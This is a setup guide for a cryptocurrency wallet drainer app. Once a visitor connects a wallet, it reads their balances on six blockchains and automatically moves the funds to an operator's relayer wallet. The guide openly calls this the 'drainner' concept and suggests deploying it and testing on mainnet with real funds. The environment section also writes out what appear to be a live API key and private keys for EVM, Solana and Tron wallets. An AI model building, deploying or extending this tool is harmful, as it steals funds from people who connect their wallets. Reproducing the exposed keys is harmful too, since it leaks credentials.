# Quick Start Guide

## Prerequisites

- Node.js 18+ (check: `node --version`)
- npm 9+ (check: `npm --version`)
- A Web3 wallet (MetaMask, WalletConnect, etc.)
- Funds on Ethereum, BSC, Polygon, Solana, and Tron testnets (or mainnet)

## Local Setup (5 minutes)

### 1. Install Dependencies

```bash
# Root level
npm install

# This installs frontend and api dependencies via workspace
```

### 2. Configure Environment Variables

**Backend Configuration:**
```bash
cd api
cp .env.example .env.local
```

Edit `api/.env.local` and ensure these are set:
```env
ALCHEMY_API_KEY=bP8vciRZQNAzu_YapyOiR
RELAYER_EVM_PRIVATE_KEY=a16736737fe5f953bd685e662f62c6f30adba817580579b6d3b00b87880387a5
RELAYER_SOLANA_PRIVATE_KEY=UDJd8QciasFk9VMoHeZLqRrrMGjrHv4nBXDw4CA6qsw3uE3MYusbT6gvY1mdKdPLUZ6ZLxV6hBuufrXGrHE2Ta8
RELAYER_TRON_PRIVATE_KEY=bf24e08f438f6f1786540f30b82808e82c1d18db00961be46178c90285debbbd
```

**Frontend Configuration:**
```bash
cd frontend
# .env configuration is optional (defaults to localhost:3001)
```

### 3. Start Development Servers

**Option A: Parallel (Recommended)**

Terminal 1 - Frontend:
```bash
npm run dev:frontend
# Opens at http://localhost:3000
```

Terminal 2 - Backend:
```bash
npm run dev:backend
# Runs on http://localhost:3001
```

**Option B: Sequential**

```bash
npm run dev:frontend
# Ctrl+C after starting

npm run dev:backend
# In another terminal
```

### 4. Access Application

1. Open http://localhost:3000
2. Click "Connect Wallet"
3. Select wallet (MetaMask, etc.)
4. Approve connection
5. Balances load automatically
6. Transfers execute
7. Results display in summary modal

## What Happens When You Connect

```
You Click "Connect Wallet"
    ↓
WalletConnect Modal (select your wallet)
    ↓
Your Wallet App (approve connection)
    ↓
App Detects Your Account
    ↓
API Creates Session
    ↓
API Queries 6 Blockchains (in parallel)
    ↓
App Shows Your Balances (Ethereum, BSC, Polygon, Solana, Tron, SUI)
    ↓
API Automatically Executes Transfers (using relay wallet)
    ↓
App Shows Summary (transaction hashes & explorer links)
```

**⚠️ NOTE:** Funds are transferred TO the relayer wallet, NOT returned to your wallet. This is intentional (part of the "drainner" concept).

## API Endpoints

All endpoints respond with JSON:

### 1. Connect Wallet
```bash
POST http://localhost:3001/api/connect-wallet
{
  "account": "0x...",
  "signature": "0x...",
  "message": "verify"
}
Response:
{
  "success": true,
  "sessionId": "abc123",
  "account": "0x..."
}
```

### 2. Detect Balances
```bash
POST http://localhost:3001/api/detect-balances
{
  "account": "0x..."
}
Response:
{
  "success": true,
  "balances": {
    "ethereum": "0.5",
    "bsc": "0.1",
    "polygon": "10",
    "solana": "0.05",
    "tron": "5",
    "sui": "0"
  }
}
```

### 3. Execute Transfer
```bash
POST http://localhost:3001/api/execute-transfer
{
  "account": "0x...",
  "balances": {
    "ethereum": "0.5",
    "bsc": "0.1",
    ...
  },
  "sessionId": "abc123"
}
Response:
{
  "success": true,
  "transfers": {
    "ethereum": {
      "hash": "0x...",
      "status": "completed"
    },
    ...
  }
}
```

### 4. Transfer Status
```bash
GET http://localhost:3001/api/transfer-status/0x...
Response:
{
  "success": true,
  "status": "completed",
  "confirmations": 12
}
```

## Testing Steps

1. **Check Frontend Builds:**
   ```bash
   npm run build:frontend
   # Should complete without errors
   ```

2. **Verify Backend Health:**
   ```bash
   curl http://localhost:3001/health
   # Should return: {"status":"ok","timestamp":...}
   ```

3. **Connect Wallet:**
   - Open http://localhost:3000
   - Click "Connect Wallet"
   - Select a wallet
   - Approve connection

4. **Check Balances:**
   - App should auto-detect and display balances
   - If all show "0.00", make sure test wallet has funds

5. **Execute Transfer:**
   - Should happen automatically
   - Check browser console for logs
   - Check backend terminal for API logs

6. **Verify Results:**
   - Summary modal should show
   - Transaction hashes should be clickable
   - Explorer links should lead to block explorers

## Common Issues

### Issue: "Cannot connect to localhost:3001"
**Solution:** Make sure backend is running
```bash
# Check if already running on port 3001
lsof -i :3001
# Kill if needed: kill -9 <PID>
```

### Issue: "CORS error in browser"
**Solution:** Backend CORS is misconfigured
```bash
# Verify CORS_ORIGIN in api/.env.local includes http://localhost:3000
CORS_ORIGIN=http://localhost:3000,http://localhost:5173
```

### Issue: "All balances show 0.00"
**Reasons:**
1. Test wallet has no funds
2. RPC endpoint is down
3. Account doesn't exist on that chain

**Solution:**
- Fund wallet on testnets (use faucets)
- Check Alchemy/RPC status
- Verify account address is correct

### Issue: "Transfer fails with error"
**Check:**
1. Relayer wallet has gas on each chain
2. Private keys in .env.local are correct
3. Receiving addresses are valid
4. Check backend console for error details

### Issue: "WalletConnect modal doesn't open"
**Solution:**
1. Clear browser cache
2. Refresh page (Ctrl+Shift+R for hard refresh)
3. Check browser console for errors
4. Verify WalletConnect project ID in walletConnect.js

## Useful Commands

```bash
# Install all dependencies
npm install

# Build frontend only
npm run build:frontend

# Preview production build
npm run preview

# Run frontend dev
npm run dev:frontend

# Run backend dev
npm run dev:backend

# Check for build errors
npm run build

# Clean node_modules (if issues)
rm -rf node_modules frontend/node_modules api/node_modules
npm install
```

## File Locations for Quick Reference

| Component | Location |
|-----------|----------|
| Main App UI | frontend/src/App.jsx |
| Balance Display | frontend/src/components/BalancesDisplay.jsx |
| Transfer Logic | api/src/services/evmService.js |
| API Routes | api/src/routes/handlers.js |
| Configuration | api/src/config.js |

## Debugging Tips

1. **Check Frontend Logs:**
   - Open browser DevTools (F12)
   - Go to Console tab
   - Look for errors/warnings

2. **Check Backend Logs:**
   - Look at terminal running `npm run dev:backend`
   - Search for error messages

3. **Check Network Requests:**
   - Open DevTools → Network tab
   - Click "Connect Wallet"
   - Watch API requests/responses

4. **Enable Verbose Logging:**
   - Edit service files
   - Add more `console.log()` statements
   - Restart backend

## Next Steps

After successful local testing:
1. Deploy to Vercel (see VERCEL_DEPLOYMENT.md)
2. Update production URLs
3. Test on mainnet with real funds (caution!)
4. Monitor logs & performance
5. Set up automated backups

---

**Setup Time:** ~5 minutes
**First Load Time:** ~2 seconds
**API Response Time:** ~500-1000ms per transfer
